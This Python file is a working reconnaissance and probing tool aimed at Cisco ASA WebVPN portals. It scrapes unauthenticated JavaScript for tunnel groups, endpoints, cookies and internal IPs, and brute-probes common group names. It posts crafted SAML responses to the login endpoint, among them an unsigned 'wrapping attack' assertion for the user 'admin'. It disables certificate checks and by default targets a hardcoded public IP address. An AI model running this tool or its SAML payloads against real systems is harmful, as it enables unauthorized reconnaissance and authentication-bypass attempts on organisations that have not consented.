"""
cisco_webvpn_js_re.py — Cisco ASA WebVPN portal JavaScript reverse engineering module.
Extracts state machine, tunnel groups, hidden endpoints, OS detection, CSRF logic,
and SAML SP surface from unauthenticated JS artifacts.

Stdlib only: urllib.request, urllib.error, ssl, re, json, os, collections
"""

import urllib.request
import urllib.error
import ssl
import re
import json
import os
import collections


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(host: str, port: int, path: str, method: str = 'GET',
           body: bytes = None, extra_headers: dict = None,
           cookies: dict = None) -> dict:
    """
    Raw fetch helper. Returns {status, headers, body_text, error}.
    Never raises — errors are captured in 'error'.
    """
    url = f'https://{host}:{port}{path}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible)',
        'Accept': 'text/html,application/xhtml+xml,*/*;q=0.9',
    }
    if extra_headers:
        headers.update(extra_headers)
    if cookies:
        headers['Cookie'] = '; '.join(f'{k}={v}' for k, v in cookies.items())

    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, context=_make_ctx(), timeout=15) as resp:
            raw = resp.read()
            return {
                'status': resp.status,
                'headers': dict(resp.headers),
                'body_text': raw.decode('utf-8', errors='replace'),
                'error': None,
            }
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode('utf-8', errors='replace')
        except Exception:
            body_text = ''
        return {'status': e.code, 'headers': dict(e.headers), 'body_text': body_text, 'error': str(e)}
    except Exception as exc:
        return {'status': None, 'headers': {}, 'body_text': '', 'error': str(exc)}


# ---------------------------------------------------------------------------
# WebVPNJSRE
# ---------------------------------------------------------------------------

class WebVPNJSRE:
    """Reverse engineer Cisco ASA WebVPN portal JavaScript artifacts."""

    JS_PATHS = [
        '/+CSCOE+/win.js',
        '/+CSCOE+/csco_ui/js/login.js',
        '/+CSCOE+/portal_js/portal.js',
        '/+CSCOE+/csco_ui/js/common.js',
        '/+CSCOE+/csco_ui/js/viewport.js',
        '/+CSCOE+/csco_ui/js/sslvpnclient.js',
    ]

    # Known a0 state codes documented from Cisco source / prior RE work
    _KNOWN_A0 = {
        2:  {'meaning': 'auth_success',              'action': 'redirect_to_portal'},
        3:  {'meaning': 'change_password_required',  'action': 'show_change_pw_form'},
        6:  {'meaning': 'account_locked',            'action': 'show_error_locked'},
        8:  {'meaning': 'auth_failed',               'action': 'show_error_invalid_creds'},
        13: {'meaning': 'secondary_auth_required',   'action': 'prompt_mfa'},
        14: {'meaning': 'banner_ack_required',       'action': 'show_banner'},
        15: {'meaning': 'pre_auth_logon_ready',      'action': 'show_logon_form'},
    }

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port
        self.js_sources: dict = {}
        self.state_machine: dict = {}
        self.tunnel_groups: list = []
        self.endpoints: list = []
        self.cookies: list = []
        self.os_matrix: dict = {}
        self.csrf_logic: dict = None
        self.hardcoded_values: list = []
        self.findings: list = []

    # ------------------------------------------------------------------
    # Fetch primitives
    # ------------------------------------------------------------------

    def fetch_js(self, path: str) -> str:
        """Download a JS file; return text or None."""
        r = _fetch(self.host, self.port, path)
        if r['status'] == 200 and r['body_text']:
            return r['body_text']
        return None

    def fetch_logon_html(self) -> str:
        """Download /+CSCOE+/logon.html — contains inline JS state machine."""
        r = _fetch(self.host, self.port, '/+CSCOE+/logon.html')
        if r['status'] == 200:
            return r['body_text']
        return None

    def fetch_portal_html(self) -> str:
        """Download /+CSCOE+/portal.html with a dummy webvpn= cookie."""
        r = _fetch(self.host, self.port, '/+CSCOE+/portal.html',
                   cookies={'webvpn': 'dummy', 'webvpnc': 'dummy'})
        return r['body_text'] if r['body_text'] else None

    # ------------------------------------------------------------------
    # Extraction routines
    # ------------------------------------------------------------------

    def extract_state_machine(self, js_text: str) -> dict:
        """
        Extract a0 response code meanings from JS text.
        Returns {code_int: {meaning_guess, message_template, action}}
        """
        machine = {}

        # Seed with known codes
        for code, meta in self._KNOWN_A0.items():
            machine[code] = dict(meta, message_template=None)

        # Pattern 1: if(a0==N) or if(a0===N) or if(a0=="N")
        for m in re.finditer(
            r'if\s*\(\s*a0\s*={2,3}\s*["\']?(\d+)["\']?\s*\)',
            js_text, re.IGNORECASE
        ):
            code = int(m.group(1))
            if code not in machine:
                machine[code] = {'meaning': 'unknown', 'action': 'unknown', 'message_template': None}
            # Try to grab the nearby msg assignment
            snippet = js_text[m.start():m.start() + 300]
            msg_m = re.search(r'msg\s*=\s*["\']([^"\']{5,120})["\']', snippet)
            if msg_m:
                machine[code]['message_template'] = msg_m.group(1)

        # Pattern 2: switch/case on a0
        for m in re.finditer(r'case\s+["\']?(\d+)["\']?\s*:', js_text):
            code = int(m.group(1))
            # Only keep if there's an a0 switch nearby (within 2000 chars before)
            preceding = js_text[max(0, m.start()-2000):m.start()]
            if re.search(r'switch\s*\(\s*a0\s*\)', preceding):
                if code not in machine:
                    machine[code] = {'meaning': 'unknown', 'action': 'unknown', 'message_template': None}
                snippet = js_text[m.start():m.start() + 400]
                msg_m = re.search(r'["\']([^"\']{5,120})["\']', snippet)
                if msg_m:
                    machine[code].setdefault('message_template', msg_m.group(1))

        # Pattern 3: a0 string values like a0 === "error"
        for m in re.finditer(r'a0\s*={2,3}\s*["\']([a-zA-Z_]\w*)["\']', js_text):
            key = m.group(1)
            if key not in machine:
                machine[key] = {'meaning': key, 'action': 'unknown', 'message_template': None}

        return machine

    def extract_tunnel_groups(self, js_text: str) -> list:
        """Extract tunnel group names from JS dropdown population code."""
        groups = []
        seen = set()

        def _add(g):
            g = g.strip().strip('"\'')
            if g and g not in seen and len(g) < 128:
                seen.add(g)
                groups.append(g)

        # group_list = ["G1", "G2", ...]  or var group_list=[...]
        for m in re.finditer(r'group_list\s*=\s*\[([^\]]+)\]', js_text):
            for item in re.findall(r'["\']([^"\']+)["\']', m.group(1)):
                _add(item)

        # addOption(sel, "GroupName", ...) — first string arg after selector
        for m in re.finditer(r'addOption\s*\([^,]+,\s*["\']([^"\']+)["\']', js_text):
            _add(m.group(1))

        # tgroup= in URL params or form fields
        for m in re.finditer(r'tgroup\s*=\s*["\']([^"\']+)["\']', js_text):
            _add(m.group(1))

        # value= on option elements for group dropdowns
        for m in re.finditer(
            r'(?:group|tg|tunnel[-_]?group).*?value\s*=\s*["\']([^"\']{2,80})["\']',
            js_text, re.IGNORECASE
        ):
            _add(m.group(1))

        # base64 encode of group in tg cookie construction
        for m in re.finditer(r'btoa\s*\(\s*["\']([^"\']+)["\']', js_text):
            _add(m.group(1))

        return groups

    def extract_endpoints(self, js_text: str) -> list:
        """Extract all URL paths referenced in JS."""
        endpoints = []
        seen = set()

        patterns = [
            # Cisco path patterns
            (r'["\'](/\+CSCOE\+/[^"\'?\s]{1,150})["\']', 'GET', 'cscoe_path'),
            (r'["\'](/\+webvpn\+/[^"\'?\s]{1,150})["\']', 'GET', 'webvpn_path'),
            (r'["\'](/admin/[^"\'?\s]{1,150})["\']', 'GET', 'admin_path'),
            (r'["\'](/api/[^"\'?\s]{1,150})["\']', 'GET', 'api_path'),
            # XHR / fetch
            (r'\.open\s*\(\s*["\']([A-Z]+)["\'],\s*["\']([^"\']+)["\']', None, 'xhr_open'),
            (r'fetch\s*\(\s*["\']([^"\']+)["\']', 'GET', 'fetch_call'),
            # location redirect
            (r'location\.href\s*=\s*["\']([^"\']+)["\']', 'GET', 'redirect'),
            # action= in forms
            (r'action\s*=\s*["\']([^"\']{3,150})["\']', 'POST', 'form_action'),
            # url = "..."
            (r'\burl\s*=\s*["\']([^"\']+)["\']', 'GET', 'url_var'),
        ]

        for pat, method, ctx in patterns:
            for m in re.finditer(pat, js_text):
                if method is None:
                    # xhr_open: groups are method, path
                    meth = m.group(1)
                    path = m.group(2)
                else:
                    path = m.group(1)
                    meth = method

                if path in seen:
                    continue
                seen.add(path)

                # Extract a context snippet (50 chars before match)
                start = max(0, m.start() - 50)
                snippet = js_text[start:m.start() + 80].replace('\n', ' ')

                endpoints.append({
                    'path': path,
                    'method': meth,
                    'context': ctx,
                    'snippet': snippet[:120],
                })

        return endpoints

    def extract_os_detection(self, win_js: str) -> dict:
        """
        Extract OS/browser detection matrix from win.js.
        Returns {os_name: {ua_patterns, portal_path, client_url}}
        """
        os_matrix = {}

        # navigator.userAgent / navigator.platform checks
        ua_checks = re.findall(
            r'(?:userAgent|platform|appVersion)\s*\.\s*(?:indexOf|match|search|toLowerCase\(\)\.indexOf)\s*\(\s*["\']([^"\']+)["\']',
            win_js, re.IGNORECASE
        )

        # Group by common OS token
        _os_tokens = {
            'Windows': ['Win', 'windows', 'WinNT'],
            'macOS':   ['Mac', 'Macintosh', 'darwin'],
            'Linux':   ['Linux', 'linux'],
            'iOS':     ['iPhone', 'iPad', 'iPod'],
            'Android': ['Android', 'android'],
        }

        for ua in ua_checks:
            for os_name, tokens in _os_tokens.items():
                if any(t.lower() in ua.lower() for t in tokens):
                    entry = os_matrix.setdefault(os_name, {
                        'ua_patterns': [],
                        'portal_path': None,
                        'client_url': None,
                    })
                    if ua not in entry['ua_patterns']:
                        entry['ua_patterns'].append(ua)

        # Portal redirect per platform — look for path following OS check
        for os_name, tokens in _os_tokens.items():
            for token in tokens:
                idx = win_js.lower().find(token.lower())
                if idx == -1:
                    continue
                snippet = win_js[idx:idx + 500]
                path_m = re.search(r'["\'](/\+(?:CSCOE|webvpn)\+/[^"\'?]{2,100})["\']', snippet)
                if path_m:
                    entry = os_matrix.setdefault(os_name, {
                        'ua_patterns': [], 'portal_path': None, 'client_url': None
                    })
                    if entry['portal_path'] is None:
                        entry['portal_path'] = path_m.group(1)

                # Client download URLs (anyconnect / webvpn client)
                url_m = re.search(
                    r'["\'](?:https?://[^"\']{5,200}\.(?:pkg|dmg|exe|msi|sh))["\']',
                    snippet, re.IGNORECASE
                )
                if url_m:
                    entry = os_matrix.setdefault(os_name, {
                        'ua_patterns': [], 'portal_path': None, 'client_url': None
                    })
                    if entry['client_url'] is None:
                        entry['client_url'] = url_m.group(0).strip('"\'')

        # Mobile detection redirect
        for mobile_token in ['iPhone', 'Android', 'mobile', 'iPad']:
            idx = win_js.lower().find(mobile_token.lower())
            if idx != -1:
                snippet = win_js[idx:idx + 400]
                path_m = re.search(r'["\']([^"\']*mobile[^"\']*)["\']', snippet, re.IGNORECASE)
                if path_m:
                    os_matrix.setdefault('Mobile', {
                        'ua_patterns': [mobile_token], 'portal_path': None, 'client_url': None
                    })['portal_path'] = path_m.group(1)

        return os_matrix

    def extract_cookie_logic(self, js_text: str) -> list:
        """
        Extract all cookie names set/read by JS.
        Returns [{name, value_pattern, path, secure, http_only_missing}]
        """
        cookies = []
        seen = set()

        # document.cookie = "name=value; ..."
        for m in re.finditer(
            r'document\.cookie\s*=\s*["\']([^"\'=]+)=([^"\']*)["\']',
            js_text
        ):
            name = m.group(1).strip()
            val_pat = m.group(2).strip()
            if name in seen:
                continue
            seen.add(name)
            full = m.group(0)
            cookies.append({
                'name': name,
                'value_pattern': val_pat[:80],
                'path': re.search(r'path=([^;]+)', full, re.I) and re.search(r'path=([^;]+)', full, re.I).group(1) or None,
                'secure': 'secure' in full.lower(),
                'http_only_missing': 'httponly' not in full.lower(),
            })

        # document.cookie read: getCookie / readCookie patterns
        for m in re.finditer(
            r'(?:getCookie|readCookie|cookie\.get)\s*\(\s*["\']([^"\']+)["\']',
            js_text, re.IGNORECASE
        ):
            name = m.group(1)
            if name not in seen:
                seen.add(name)
                cookies.append({
                    'name': name,
                    'value_pattern': None,
                    'path': None,
                    'secure': None,
                    'http_only_missing': None,
                })

        # Regex cookie parse: document.cookie.match(/name=([^;]+)/)
        for m in re.finditer(r'document\.cookie\.(?:match|search)\s*\(/([^/=]+)=', js_text):
            name = m.group(1).strip()
            if name not in seen:
                seen.add(name)
                cookies.append({
                    'name': name,
                    'value_pattern': 'regex-extracted',
                    'path': None,
                    'secure': None,
                    'http_only_missing': None,
                })

        return cookies

    def extract_csrf_pattern(self, js_text: str) -> dict:
        """
        Find CSRF token generation/validation in JS.
        Returns {source, field_name, cookie_name, validation_endpoint}
        """
        result = {
            'source': None,
            'field_name': None,
            'cookie_name': None,
            'validation_endpoint': None,
        }

        # document.cookie = "CSRFtoken=..."
        csrf_cookie = re.search(
            r'document\.cookie\s*=\s*["\']?(CSRF[^=\s"\']+)\s*=\s*',
            js_text, re.IGNORECASE
        )
        if csrf_cookie:
            result['cookie_name'] = csrf_cookie.group(1)
            result['source'] = 'js_set_cookie'

        # Hidden form field
        field_m = re.search(
            r'(?:name|id)\s*=\s*["\']([^"\']*csrf[^"\']*)["\']',
            js_text, re.IGNORECASE
        )
        if field_m:
            result['field_name'] = field_m.group(1)
            if result['source'] is None:
                result['source'] = 'hidden_form_field'

        # Server-set cookie read back
        server_m = re.search(
            r'getCookie\s*\(\s*["\']([^"\']*csrf[^"\']*)["\']',
            js_text, re.IGNORECASE
        )
        if server_m:
            result['cookie_name'] = server_m.group(1)
            result['source'] = 'server_set_cookie'

        # Token sent to endpoint
        ep_m = re.search(
            r'(?:post|send|submit).*?["\']([^"\']*(?:csrf|token|auth)[^"\']*)["\']',
            js_text, re.IGNORECASE
        )
        if ep_m:
            val = ep_m.group(1)
            if val.startswith('/'):
                result['validation_endpoint'] = val

        return result if any(result.values()) else None

    def find_hardcoded_values(self, js_text: str) -> list:
        """
        Scan JS for hardcoded values of interest.
        Returns [{type, value, context}]
        """
        findings = []

        def _add(typ, val, ctx=''):
            findings.append({'type': typ, 'value': val, 'context': ctx[:100]})

        # RFC1918 IPs
        for m in re.finditer(
            r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b',
            js_text
        ):
            ctx = js_text[max(0, m.start()-40):m.end()+40]
            _add('internal_ip', m.group(1), ctx)

        # Hostnames in strings
        for m in re.finditer(
            r'["\']([a-zA-Z0-9][-a-zA-Z0-9]{2,}\.(?:internal|local|corp|intranet|lan)\b[^"\']*)["\']',
            js_text, re.IGNORECASE
        ):
            _add('internal_hostname', m.group(1))

        # Version strings
        for m in re.finditer(
            r'(?:ASA|ASDM|WebVPN|Version)\s+([\d.()A-Za-z]+)',
            js_text, re.IGNORECASE
        ):
            _add('version_string', m.group(0))

        # API/token-looking values (hex 32+ chars, or base64 40+ chars)
        for m in re.finditer(r'\b([0-9a-f]{32,})\b', js_text, re.IGNORECASE):
            _add('hex_token_candidate', m.group(1))

        # Error messages that disclose paths or internals
        for m in re.finditer(
            r'["\']([^"\']*(?:error|failed|exception|denied|unauthorized)[^"\']{10,120})["\']',
            js_text, re.IGNORECASE
        ):
            _add('error_disclosure', m.group(1))

        return findings

    # ------------------------------------------------------------------
    # Main entry
    # ------------------------------------------------------------------

    def analyze(self) -> dict:
        """Fetch all JS + HTML, run all extractions, return aggregated results."""
        fetched_paths = []
        all_js = ''

        # Fetch JS paths
        for path in self.JS_PATHS:
            text = self.fetch_js(path)
            if text:
                self.js_sources[path] = text
                fetched_paths.append(path)
                all_js += '\n' + text

        # Fetch HTML (inline JS)
        logon_html = self.fetch_logon_html()
        if logon_html:
            fetched_paths.append('/+CSCOE+/logon.html')
            all_js += '\n' + logon_html

        portal_html = self.fetch_portal_html()
        if portal_html:
            fetched_paths.append('/+CSCOE+/portal.html (dummy cookie)')

        # Run extractions over combined JS corpus
        if all_js:
            self.state_machine = self.extract_state_machine(all_js)
            self.tunnel_groups = self.extract_tunnel_groups(all_js)
            self.endpoints = self.extract_endpoints(all_js)
            self.cookies = self.extract_cookie_logic(all_js)
            self.csrf_logic = self.extract_csrf_pattern(all_js)
            self.hardcoded_values = self.find_hardcoded_values(all_js)

        # win.js-specific OS matrix
        win_js_text = self.js_sources.get('/+CSCOE+/win.js', '')
        if win_js_text:
            self.os_matrix = self.extract_os_detection(win_js_text)

        # Promote findings
        self._promote_findings()

        return {
            'host': self.host,
            'port': self.port,
            'fetched_paths': fetched_paths,
            'js_sizes': {p: len(t) for p, t in self.js_sources.items()},
            'state_machine': self.state_machine,
            'tunnel_groups': self.tunnel_groups,
            'endpoint_count': len(self.endpoints),
            'endpoints': self.endpoints,
            'os_matrix': self.os_matrix,
            'csrf_logic': self.csrf_logic,
            'hardcoded_values': self.hardcoded_values,
            'cookies': self.cookies,
            'findings': self.findings,
        }

    def _promote_findings(self):
        """Promote high-value items to self.findings."""

        # Exposed internal IPs
        for hv in self.hardcoded_values:
            if hv['type'] == 'internal_ip':
                self.findings.append({
                    'severity': 'MEDIUM',
                    'title': 'Internal IP in JS',
                    'detail': hv['value'],
                    'context': hv.get('context', ''),
                })

        # CSRF token absence / weak pattern
        if self.csrf_logic is None:
            self.findings.append({
                'severity': 'HIGH',
                'title': 'No CSRF token pattern detected in JS',
                'detail': 'Login/portal forms may lack CSRF protection',
            })
        elif self.csrf_logic.get('source') == 'js_set_cookie':
            self.findings.append({
                'severity': 'HIGH',
                'title': 'CSRF token set by JS (not HttpOnly server cookie)',
                'detail': f"Cookie: {self.csrf_logic.get('cookie_name')} — readable by JS, XSS-pivotable",
            })

        # Cookies missing HttpOnly
        for ck in self.cookies:
            if ck.get('http_only_missing') is True:
                self.findings.append({
                    'severity': 'MEDIUM',
                    'title': f"Cookie missing HttpOnly: {ck['name']}",
                    'detail': f"JS-settable cookie exposes session token to XSS pivot",
                })

        # Tunnel groups found — enumerate surface
        if self.tunnel_groups:
            self.findings.append({
                'severity': 'INFO',
                'title': f"{len(self.tunnel_groups)} tunnel group(s) enumerated from JS",
                'detail': ', '.join(self.tunnel_groups[:20]),
            })

        # Version disclosure
        for hv in self.hardcoded_values:
            if hv['type'] == 'version_string':
                self.findings.append({
                    'severity': 'LOW',
                    'title': 'Version string in JS',
                    'detail': hv['value'],
                })

        # Hidden admin/api endpoints
        admin_eps = [e for e in self.endpoints if '/admin/' in e['path'] or '/api/' in e['path']]
        if admin_eps:
            self.findings.append({
                'severity': 'MEDIUM',
                'title': f"{len(admin_eps)} admin/API endpoint(s) in JS",
                'detail': ', '.join(e['path'] for e in admin_eps[:10]),
            })

    def report(self) -> str:
        """Human-readable summary of RE findings."""
        lines = [
            f'WebVPN JS RE — {self.host}:{self.port}',
            f'JS files fetched:  {len(self.js_sources)}',
            f'State machine codes: {len(self.state_machine)}',
            f'Tunnel groups:       {len(self.tunnel_groups)}',
            f'Endpoints found:     {len(self.endpoints)}',
            f'Cookies tracked:     {len(self.cookies)}',
            f'Hardcoded values:    {len(self.hardcoded_values)}',
            f'CSRF logic detected: {"yes" if self.csrf_logic else "no"}',
            '',
        ]

        if self.tunnel_groups:
            lines.append('TUNNEL GROUPS:')
            for g in self.tunnel_groups:
                lines.append(f'  {g}')
            lines.append('')

        if self.state_machine:
            lines.append('STATE MACHINE (a0 codes):')
            for code in sorted(self.state_machine.keys(), key=lambda x: str(x)):
                meta = self.state_machine[code]
                msg = meta.get('message_template') or ''
                lines.append(f'  a0={code}: {meta.get("meaning","?")}  {msg[:60]}')
            lines.append('')

        if self.findings:
            lines.append('FINDINGS:')
            for f in self.findings:
                sev = f.get('severity', 'INFO')
                title = f.get('title', '')
                detail = str(f.get('detail', ''))[:120]
                lines.append(f'  [{sev}] {title}: {detail}')

        return '\n'.join(lines)


# ---------------------------------------------------------------------------
# WebVPNSAMLRE
# ---------------------------------------------------------------------------

class WebVPNSAMLRE:
    """RE the SAML SP implementation on Cisco ASA."""

    SAML_PATHS = [
        '/+CSCOE+/saml/sp/metadata',
        '/+CSCOE+/saml/sp/acs',
        '/+CSCOE+/saml/sp/login',
        '/+CSCOE+/saml/sp/logout',
        '/+CSCOE+/saml/sp/slo',
    ]

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port
        self.sp_entity_id: str = None
        self.acs_url: str = None
        self.idp_hints: list = []
        self.findings: list = []

    def probe_metadata(self) -> dict:
        """
        GET /+CSCOE+/saml/sp/metadata.
        Parse XML for entityID, ACS URL, signing cert.
        """
        r = _fetch(self.host, self.port, '/+CSCOE+/saml/sp/metadata')
        result = {
            'status_code': r['status'],
            'entity_id': None,
            'acs_url': None,
            'signing_cert_pem': None,
            'error_message': r['error'],
            'raw_snippet': r['body_text'][:500] if r['body_text'] else None,
        }

        body = r['body_text']
        if not body:
            return result

        # entityID
        m = re.search(r'entityID\s*=\s*["\']([^"\']+)["\']', body)
        if m:
            result['entity_id'] = m.group(1)
            self.sp_entity_id = m.group(1)

        # AssertionConsumerService URL
        m = re.search(
            r'AssertionConsumerService[^>]+Location\s*=\s*["\']([^"\']+)["\']',
            body
        )
        if m:
            result['acs_url'] = m.group(1)
            self.acs_url = m.group(1)

        # Signing cert (base64 block)
        m = re.search(r'<(?:\w+:)?X509Certificate>([\s\S]+?)</(?:\w+:)?X509Certificate>', body)
        if m:
            result['signing_cert_pem'] = '-----BEGIN CERTIFICATE-----\n' + m.group(1).strip() + '\n-----END CERTIFICATE-----'

        # IdP hints from error body
        idp_hints = re.findall(r'(?:idp|provider|sso)[^\s"\'<>]{3,80}', body, re.IGNORECASE)
        result['idp_hints'] = idp_hints[:10]
        self.idp_hints.extend(idp_hints)

        # Promote finding if metadata is public
        if r['status'] == 200 and result['entity_id']:
            self.findings.append({
                'severity': 'INFO',
                'title': 'SAML SP metadata accessible unauthenticated',
                'detail': f"entityID: {result['entity_id']}",
            })

        return result

    def test_acs_endpoint(self) -> dict:
        """
        POST ACS with four payloads to map error surface and wrapping receptivity.
        """
        import base64

        acs_path = '/+CSCOE+/saml/sp/acs'
        headers_form = {'Content-Type': 'application/x-www-form-urlencoded'}

        def _post(body_bytes):
            r = _fetch(self.host, self.port, acs_path, method='POST',
                       body=body_bytes, extra_headers=headers_form)
            return {
                'status': r['status'],
                'location': r['headers'].get('Location') or r['headers'].get('location'),
                'set_cookie': r['headers'].get('Set-Cookie') or r['headers'].get('set-cookie'),
                'body_snippet': r['body_text'][:300] if r['body_text'] else None,
                'error': r['error'],
            }

        # 1. Empty body
        empty = _post(b'')

        # 2. Malformed SAMLResponse (not base64)
        malformed = _post(b'SAMLResponse=!!NOT_BASE64!!')

        # 3. Valid base64 of empty XML
        xml_b64 = base64.b64encode(b'<xml/>').decode()
        xml_resp = _post(f'SAMLResponse={xml_b64}'.encode())

        # 4. XML wrapping attack skeleton
        wrapping_xml = (
            b'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"'
            b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            b'<saml:Assertion><saml:Subject>'
            b'<saml:NameID>admin</saml:NameID>'
            b'</saml:Subject></saml:Assertion></samlp:Response>'
        )
        wrapping_b64 = base64.b64encode(wrapping_xml).decode()
        wrapping = _post(f'SAMLResponse={wrapping_b64}'.encode())

        # Infer ACS receptivity
        accepts_arbitrary = (
            wrapping['status'] not in (None, 400, 403, 404, 500)
            and wrapping['status'] != empty['status']
        )

        result = {
            'empty_body_response': empty,
            'malformed_response': malformed,
            'xml_response': xml_resp,
            'wrapping_attempt_response': wrapping,
            'acs_accepts_arbitrary_xml': accepts_arbitrary,
        }

        if accepts_arbitrary:
            self.findings.append({
                'severity': 'HIGH',
                'title': 'ACS endpoint may accept arbitrary XML (wrapping candidate)',
                'detail': f"Wrapping status={wrapping['status']} vs empty={empty['status']}",
            })

        return result

    def enumerate_tunnel_groups_saml(self) -> list:
        """
        Probe /+CSCOE+/saml/sp/login with tgroup= to map SAML vs local auth per group.
        Uses common Cisco group name heuristics.
        """
        candidate_groups = [
            'DefaultWEBVPNGroup',
            'DefaultRAGroup',
            'RA',
            'VPN',
            'SSLVPN',
            'SSLUsers',
            'Users',
            'Employees',
            'Contractors',
            'Split',
            'FullTunnel',
            'AnyConnect',
        ]

        results = []
        for group in candidate_groups:
            import base64
            # tg cookie = base64(group)
            tg_val = base64.b64encode(group.encode()).decode()
            r = _fetch(
                self.host, self.port,
                f'/+CSCOE+/saml/sp/login?tgroup={group}',
                cookies={'tg': tg_val},
            )
            auth_type = 'unknown'
            if r['status'] in (301, 302, 303, 307, 308):
                loc = r['headers'].get('Location') or r['headers'].get('location') or ''
                if 'saml' in loc.lower() or 'sso' in loc.lower():
                    auth_type = 'saml_redirect'
                else:
                    auth_type = 'local_redirect'
            elif r['status'] == 200:
                body = r['body_text']
                if 'saml' in body.lower() or 'sso' in body.lower():
                    auth_type = 'saml_form'
                else:
                    auth_type = 'local_form'
            elif r['status'] in (400, 403, 404):
                auth_type = f'rejected_{r["status"]}'

            results.append({
                'group': group,
                'status': r['status'],
                'auth_type': auth_type,
                'location': r['headers'].get('Location') or r['headers'].get('location'),
            })

        # Promote groups that route to SAML
        saml_groups = [g['group'] for g in results if 'saml' in g.get('auth_type', '')]
        if saml_groups:
            self.findings.append({
                'severity': 'INFO',
                'title': 'Tunnel groups routing to SAML',
                'detail': ', '.join(saml_groups),
            })

        return results

    def analyze(self) -> dict:
        """Run full SAML RE chain."""
        metadata = self.probe_metadata()
        acs = self.test_acs_endpoint()
        tg_saml = self.enumerate_tunnel_groups_saml()

        # Probe remaining SAML paths for surface mapping
        path_surface = {}
        for path in self.SAML_PATHS:
            if path == '/+CSCOE+/saml/sp/acs':
                continue  # already probed above
            r = _fetch(self.host, self.port, path)
            path_surface[path] = {
                'status': r['status'],
                'body_snippet': r['body_text'][:200] if r['body_text'] else None,
                'error': r['error'],
            }

        return {
            'host': self.host,
            'port': self.port,
            'sp_entity_id': self.sp_entity_id,
            'acs_url': self.acs_url,
            'idp_hints': self.idp_hints,
            'metadata': metadata,
            'acs_probes': acs,
            'tunnel_group_saml_map': tg_saml,
            'path_surface': path_surface,
            'findings': self.findings,
        }


# ---------------------------------------------------------------------------
# Top-level entry
# ---------------------------------------------------------------------------

def analyze_webvpn(host: str, port: int = 443) -> dict:
    """Run WebVPNJSRE + WebVPNSAMLRE; return combined findings."""
    js_re = WebVPNJSRE(host, port)
    js_result = js_re.analyze()

    saml_re = WebVPNSAMLRE(host, port)
    saml_result = saml_re.analyze()

    all_findings = js_result.get('findings', []) + saml_result.get('findings', [])

    return {
        'host': host,
        'port': port,
        'js_re': js_result,
        'saml_re': saml_result,
        'findings': all_findings,
        'summary': js_re.report(),
    }


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    import sys

    host = sys.argv[1] if len(sys.argv) > 1 else '207.254.16.2'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443

    result = analyze_webvpn(host, port)
    print(json.dumps(result, indent=2, default=str))

    for f in result.get('findings', []):
        sev = f.get('severity', 'INFO')
        title = f.get('title', '')
        detail = str(f.get('detail', ''))[:150]
        print(f'[{sev}] {title}: {detail}')
